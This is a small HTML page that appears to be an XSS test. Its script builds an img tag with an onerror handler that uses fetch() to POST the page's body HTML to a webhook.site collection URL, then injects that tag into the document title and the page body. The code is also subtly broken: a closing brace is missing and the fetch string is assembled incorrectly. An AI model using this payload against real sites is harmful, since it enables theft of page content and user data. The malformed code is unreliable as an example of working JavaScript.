<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Set content script to title</title>
</head>
<body>
  <p>"DATA"</p>
    <script>
        // Function to stringify a request object
        function stringifyRequest(method, url, body, headers) {
            return JSON.stringify({
                method: method,
                url: url,
                body: body,
                headers: headers
            });
        }

        // Function to create a script tag with a POST request
        function createScriptWithPostRequest() {
            var method = "POST";
            var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
            var body = JSON.stringify({
                Contents: document.body.innerHTML
            });
            var headers = {
                "Content-type": "application/json; charset=UTF-8",
                "mode": "no-cors"
            };

            var requestString = stringifyRequest(method, url, body, headers);
            var fetchString = 'fetch(' + url + ', {method: ' + method + ', body: ' + body + ', headers: ' + headers + '})';
            var XSS = '<img src="/" onerror="' + fetchString + '"/>';
            document.title = XSS;

            var container = document.createElement('div');
            container.innerHTML = XSS;
            document.body.appendChild(container);

        // Wait for 3 seconds and then create the script tag with the POST request
        setTimeout(function () {
            createScriptWithPostRequest();
        }, 3000);
    </script>
</body>
</html>
